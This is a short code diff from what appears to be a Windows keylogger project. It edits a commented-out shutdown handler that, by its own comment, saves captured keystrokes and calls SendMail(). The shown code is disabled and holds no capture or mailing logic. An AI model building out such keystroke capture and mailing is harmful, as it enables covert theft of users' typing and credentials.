@@ -97,13 +97,13 @@ void Read()
     }
 }
 
-//Not working feature
+//Not working feature (Event isn't called)
 //BOOL WINAPI HandlerRoutine(DWORD CEvent)
 //{
 //    //Save strokes on pc shut down
 //    if (CEvent == CTRL_SHUTDOWN_EVENT)
 //    {
-//        EmergencySave();
+//        Save();
 //        SendMail();
 //    }
 //    return TRUE;
